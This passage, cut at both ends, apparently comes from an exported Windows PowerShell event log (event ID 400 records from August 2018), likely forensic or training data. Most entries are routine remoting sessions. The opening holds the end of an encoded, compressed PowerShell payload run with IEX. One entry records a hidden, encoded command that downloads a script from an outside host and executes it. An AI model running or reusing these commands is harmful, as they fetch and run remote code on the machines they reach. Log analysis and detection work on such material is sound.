GkAbgBDAG4ATABVAGkARgBjAHMAUwB6AE0AbAB1ADAAcgBZAEgASQB5AFUAUQBLADUAYwA0AFoAMwArAEQANQA3AHYATABzAGwAQwByADgAZQBOAGEAZQBXAC8AaQBYAG0ASwAvAEYAOAB5AFIAVABlAEwARABBAE0AWgBRAHIATQBjAEQARQBmAHoASwBDAG0AMwAzAHAATgBsADYAVQBaAFcAZgBGAHIAUgBiADQAdQBYAHQAWgB1AEUARwBhAHAAMQAvAE0AbABIAG4AZwBaAHEAQwA2AEoAcABWAEcAaQBKADkANQBzADYANwBoAGkAMgBXAFMAdgBwAHcAOAA3AGoAVQBLACsAWgBTAHIAMQBwADEAMwBiAEcAZAAwAHUAUABTADIAeQBZAGIAbABZAFAARABVAFoAZABuAHkAQgByAE4AdABNAFYAMgBtAGsAeABwAEYAZABIAFYAZQBYAHQAegBpAEUAcAA2AHYAUwBhAHUAZwBRAGMAVgBDAFkASwAwAFUAbQBhAHEAUgBuAHQAegBqAFkAcAB1AHYAYQBLAEYAWQA0AGcATAB3AG0ALwBGAEYAZQBGAFEAZwB0AGcAbwBlAHAAegByAHQAcwBYAEUANwBiAFoAUgBlAGwAegBJAHMAWABEAFgAagB1AE8AMgBJAEwAUwA2AHAAZQAzAG0AcQBTAHcAcQB6AGsATQA5AHAAdQA1AGIAcwBDAFQATABUAGUASQByAHUAegBOAFYAeABzAFAATgBHAFIAKwB5AHoASgBrAE8AcwBWAGwAbABZADAAawBRAE8ANABxAEYAQwBPAEEAOABIAEcAcABxAEQAVwB5ADgALwBSAFIAaQBqAFoAMgBlAEEAQwBqAHIAUwBsAFEAcQBsAFoAcQBSAFQAcgBkAEwAUABSAFoATwBtAGwAZQBiAEgAOABzAHEAVwB6AGQAawBaAFQAbQBlAEQAagB4ADcAdgBKADcAMgBKACsASABiADMASwA5ADQANgB0AEIALwBrADcAVAB3ADkATwBTADAAdAA4AEYAaQBQAGMAUgBhAHYAOQB5AHgATABIAGMANgBDADIATgAvADEARgAvAEwAZgBtAHUAKwBCAEQAUgAzAGUAMQAwAGYAMABzAHAAcQB6AEUAdAA0ADAAWABpAGMAbgBqAHkAaABjADIAagBXADUAcQB3AGoAQwBiAEoAKwBlAGwAbwBxAGIATABvAHcANgBkAHEAWgAxAHAAVgAyAEoAYwBJADIARABkAGEAZABkAGoAUgBTACsAVgBpAFIAdAByAHQAMQB0AFIASwB2AGwAagBOAHYAWgBSAC8AbwArAEMAaQBPAHQARABLAFYAbABkAFkAKwBIAEwAWQBDAFMANABkADgAUABIAFUAZQBhADgAWgBSAEgATwB1AFMAVQBCADMAcwAyAGcAMQBGAE4AaQBmADYAYQBWAFUARwBXADgAMgB3ADYAZgA1AHAAOABWAEEAZQBuAEwAVABVAGYAcQA3AEoAbQBuAGIAOQBsAC8AWQBqAHkAWgBMAGUANQBFAGwAcwBWAEMAdQA5ADYAbQBUAFYAYwBGAGYATAAyAEcAMQBCAEcAUQBpAFAATgBYAFgAVABNAEMAZgBxAFUANgA4AHYAdgAvAFcAMQBKADYAcwBpAEwAawAxAFIARwAvAGMAYQBpAHcAVwBSADIAcgB3AFEAUgByAHQAdQBWAGIAZgBhAGQAeQB3AGUAdAB5AFQALwByAGUAeQAzADAAWAA1AHQAeQBhAFAAOQAzAFcAQQB6AHMAegB0ACsAZgB6AHAAegA0AEIAQwBxADAAMQByADMAbwBkADAAYwBxAEkASgBYADUANABWAHgAaQA1AGMAYgBLADMAMABaAHMAZgBhAHMAMQBhAGoANwBEADQAZAA2ADMAeABxAE4AZAA1AEwAawBMAEYAZwBMAFAAZQByAGkAbwBkAFEAagAzAFYAaQBhADAAYQBBADYAcQBUAG4AUgBtAGoAKwB4AFgAagA5AGUAYgAwACsAbwB1AHAAMgBkAG8AdQBpAEEAZwAxAFcAMQAvACsARAB2ADQAagBYAHEAOAByAHAAcQB5AFcARgB0AGYAWABJADEAdwBhAHkAcwB5AHEAegBkADEAZwB3ADUAVwBoADUAVgB2AE4AcQBPAGkATgA2AGYAUgBNAGUANAAzAEwARgByAEEAMABoAFIAMQAxAE8AYgBqAHoAegB2AFYAeQBVAFYAUABUAHcAOABiAG8ATwBXADMAVwBzADQAKwAwAEYANQA2AFoAQgB1AGQAYwB5AHYAZQBwAHIAbgBpAEYAYgBaAGoAVQBXADMATwBWAGcAUQBIAFgAUwBLADkAcQBJAHIAaQBLAEMAVwBqAGkAVQBJAEkAQgBPADkAdQBsADEANQA4AG8AUwBDAEQAdQBkAGgAcQBtAHAAQgByAE8AcgB5AG4ARwBEAFEAcQBTAEMAQQBrAFoAaABvAEYAZQBxAFYAUQAxAEsAdABkAHUAYwBkAEUAaAB0AGkAegBDADgARgBFACsAdQByACsASQA1ADQAcABVADIAcABOAE4AeQBsAHUAZQBMAEgASwBsACsARgA2AHoAUwBhAEMAdgBQAHcAcgByAGwATQBxAGwARgBhAFcAeQBMADAAbwBiAEwAOAByAGsAawBaAEkAagAvAFkASQBnAG8AVgBCAHgAcQBOADYAMgB0AEMAZABuADMANQAwAGkANQBNAFgASgBKADQANQBIAEsAZgBkADcAaAA3ADcARAB1AFkAUQB2AGMASAAvAGUARwAxAHUAQQBxAFUAdQBrAGIAUwA0AFAAeQBtADAANABCADIANgA5AHcARQB2AGMAQgBMAFIASQBOAGgAcgBmAHIAcABLAE0AKwA5AEcAMABKAFgAYwA5ADcAVABPAHQAeABzADAAaQBiAGcAcwBzAE4AcgBMADMAUQAxAC8AUABMAGwAQwBiAFoAMwBxAGUAVgBKAGMAUwAwAE8AcwBHAE8AeABiAFkARQByAEgAMgByAGwAYwBqAG4ANQA1ADgAdgA1AHoASgAvAFQASQByAG4AZQBNAGYAYwBlAHIAcABBADAAUQBSACsAUQBmAEYAeQBKAHAAaQB0AGQAMgBmAGQARAB4ADgAYgAvAHgAdwBUADgAdABPAGgALwBwAHoAWQBoAEwAKwAyAGoAMwBxAGwATABBAFgAMwBPAFYAegA2AFQALwBaAGIASgBLAEIAdgB1AHcAMwB4AEEAVAB2AEMAVgBnAE4AKwA0AFoAagA3AHAARABRAE8ARwBmAEgAYQAvAGMAOQBmAHcAUwBaAEcAKwBJADMATwAzAEsATQA4AHAANwBTAFYAMwBpADcAZwBmADMARAAxAHMAVAB3AGgAcQBWAGYAaQB1ADgASwAwAHcAZQBXAEYAeQA1ADgAKwBrADcAMQB5AE0AeQBOAG4AeABPAHoAZgBEAEIAbwBZADIAOQA3ADcAbgByAHUARgBOAGkASwBIAHYAUwBVAEsAbgBRAFIASgBqAG0AUABzAFgAbQByAHAATwBVAFgAYwBOAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=
+	EngineVersion=5.1.16299.547
+	RunspaceId=b7151960-afa6-49e1-aafb-db93785cd4c5
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/30/2018 3:13:48 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=23533ed5-cedf-400d-b374-d29c07434c59
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=e9c1f61d-407b-463c-9e13-8f7e900867fe
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/30/2018 6:34:02 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=eb73d381-df9b-4076-bcb9-304dbad22dcb
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=d91de75e-484d-4828-8292-58f397301d56
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/30/2018 6:16:31 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=77402a3f-fa06-4190-94f9-ece60245e2f4
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=992479c3-ddb2-49f4-a145-be7c84f6b3f9
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/28/2018 11:32:57 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=ConsoleHost
+	HostVersion=1.0
+	HostId=21848d92-e508-4a97-957f-2f7e41842488
+	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=5e1ba1ed-f9d0-456f-b86d-570d5186ca3f
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/28/2018 11:21:25 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=d5b44eeb-84a8-498d-ae6f-a96874da5b94
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=75a58133-0900-4d34-ac48-04570dccf310
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/28/2018 10:00:01 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=22703b88-720d-4b71-8d9e-bcbd61f5c593
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=a77ca6fb-ed06-458a-9541-38e35358c3b0
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/28/2018 8:59:09 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=ConsoleHost
+	HostVersion=1.0
+	HostId=a027dbe9-2dea-42f1-bb1e-723e19654135
+	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=fb9c7d8e-7824-46ec-97b3-d59a88b9c3fd
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/28/2018 8:58:39 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=31
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=4c185ec9-a43a-483e-948e-83a831f75b49
+	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=ac94b02d-ae15-4549-81d8-e0b185e085f3
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/28/2018 8:58:39 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=ConsoleHost
+	HostVersion=1.0
+	HostId=1b909dfa-0669-456a-8253-24cad06a9d71
+	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=38725bb4-ab93-4ac7-b861-6106cb1f5993
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/28/2018 8:58:23 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=31
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=b08ec2e7-c12a-430a-b390-7e5403a4eba1
+	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=5aa3a1a5-0965-44ac-a8f7-e02422d2bfc0
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/28/2018 8:58:22 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=ConsoleHost
+	HostVersion=1.0
+	HostId=38dcf4cb-6379-47ff-ac9c-8a2f3470bb60
+	HostApplication=C:\WINDOWS\sysnative\rundll32.exe
+	EngineVersion=5.1.16299.547
+	RunspaceId=042d679a-d0eb-42ee-99fa-6a18afa2e7af
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/28/2018 5:42:50 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=100c5083-79e2-42fc-8277-b9fb80f62b3d
+	HostApplication=c:\windows\syswow64\windowspowershell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=ad9218a1-0833-40cf-a4e5-403bf9a14dd5
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/28/2018 5:42:38 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.16299.547
+	HostId=4580997c-5483-4e4c-8d70-91f6f9c926de
+	HostApplication=powershell.exe -nop -w hidden -ec SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApACkA
+	EngineVersion=5.1.16299.547
+	RunspaceId=a8d0ad5e-4dae-46e0-a4e6-96ab521d1d8d
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/25/2018 12:50:28 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=54a86788-fc97-4c57-80c0-c1acc7cfc77c
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=6af35a11-d609-4cb5-a376-5ce0b7b2ef0d
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/25/2018 12:33:06 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=26a6c26b-d2c0-4a1a-93b6-049711168462
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=74175333-67bd-451b-94b1-52dc0dbecb44
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/24/2018 11:52:17 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=76bdb782-9e44-4b33-9084-a45a7a0fe8d9
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=84119f84-544a-45c9-b281-75d653be9824
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/24/2018 11:30:01 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=05f8b083-7511-4703-8d1e-ae9490e516b9
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=b3deaec5-bea4-46a6-bfa8-740e47b45db7
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/22/2018 12:48:00 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=810a9fd0-f179-4167-85bd-07adf2a7f7b3
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=2f288e70-ca14-4458-8a79-cbb5e802770a
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/17/2018 6:51:07 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=3a893e33-de95-4c1a-b43c-363a6e98503c
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=9adb101b-d815-4516-97c0-ec407f298011
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/17/2018 6:10:11 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=9ba4be04-ee90-4535-b99b-f3d999fe8c48
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=bb6ffd5c-2e14-4383-80ff-e903a1313e8c
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/17/2018 5:57:22 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=b416b58c-e00a-4ea6-83ba-bd345bd1837d
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=95b2588d-2534-4bf8-b76b-e647b15eaef5
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/17/2018 4:04:37 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=af5deeaa-4857-43b8-af35-2c45213dd3c0
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=11f3eeb0-994a-4552-b469-89d62ccf317f
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/17/2018 4:04:22 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=183da83b-e5e8-4983-975d-fcbfb8876424
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=638e5220-c19e-487b-ae3b-e0176ea34991
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/17/2018 4:03:55 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=fda8a96e-b992-4412-b4b3-270271b5ee81
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=17f944c7-8dc1-4af7-9c56-d8f3a91e40fb
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/17/2018 4:02:48 AM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=cb2a9e46-6f33-4cba-8225-7c45bc95291c
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=b145db71-11ff-4cd9-901d-44b6815a5acd
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/16/2018 7:14:47 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=f7495da1-91ac-4f6e-b36f-9b8cce16170f
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=04284efa-bbd9-4cac-b620-7451a2a8897b
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/16/2018 7:10:34 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=84ac741f-00ef-4719-bce2-8f76b8b4475f
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=2acab1cb-8e37-429c-9726-f7692e748b19
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 7:10:04 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=911adf1f-6281-4daf-8afb-cb59c198fe8c
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=78473fb5-9d0d-4169-b1af-6b68d2364ef0
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 7:07:10 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=22720aac-dd32-4d15-8eab-6a6274c4903e
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=be2fe1af-08fb-4ab3-b7ae-58428bf2a5bc
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:42:09 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=e88ad3f4-2032-4e5f-826c-6ca6259d5cdc
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=3268bd0a-4fb2-4199-8dbb-911d58321bcd
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:39:41 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=d9782e59-2987-4da0-b8df-5f15521d9297
+	HostApplication=C:\WINDOWS\system32\wsmprovhost.exe -Embedding
+	EngineVersion=5.1.16299.547
+	RunspaceId=50ec4d64-a213-442f-9f6b-c9e600532811
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:37:20 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=10852c9c-13c6-499f-bba1-f179f9f14deb
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=b5ff2f66-fca7-4e16-9a12-5351a48c0146
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:37:19 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=65
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=b9220464-f199-491c-bd21-6132877b17d8
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=3af6fe3c-e95c-49c2-9110-791eeef24f30
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:37:19 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=39
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=2bef8977-1d3e-474a-849b-43e8ad169062
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=b8e11592-b3ff-46f0-b718-871c9fbd784e
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:37:18 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=a2d66ee0-1787-4fa5-a4e3-944e2211df15
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=2b2f3a5d-4fd1-4483-95a1-ccbb1538245c
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:37:18 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=65
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=93489d60-c394-459d-b1ad-e0df530bd8a8
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=23e8b1b9-05e4-4f41-89b7-cc6d21a89c05
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:37:18 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=39
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=cec2038b-d543-4328-b727-fc588809173e
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=544fb40b-919d-4b9c-89c3-6288ca27c529
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:37:17 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
+	HostId=8a6d176e-1b15-4182-80fd-e2071f193d64
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=75226fd5-98b3-48ac-8a7c-4dd5ef122ab0
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:37:15 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=65
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=7897b76d-4e74-4ea1-bb00-8685e80d88c4
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=51b9ae00-4d30-4deb-a1cd-193110d9cee3
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:37:15 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=39
+
+	HostName=Default Host
+	HostVersion=5.1.16299.547
+	HostId=32474b6b-44c7-49b9-971f-b920227a1e1f
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Version 5.1 -s -NoLogo -NoProfile
+	EngineVersion=5.1.16299.547
+	RunspaceId=d3e434d0-b81d-45bc-bffe-42dd1c51e9ba
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","400"
+"8/15/2018 6:37:14 PM","	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ServerRemoteHost
+	HostVersion=1.0.0.0
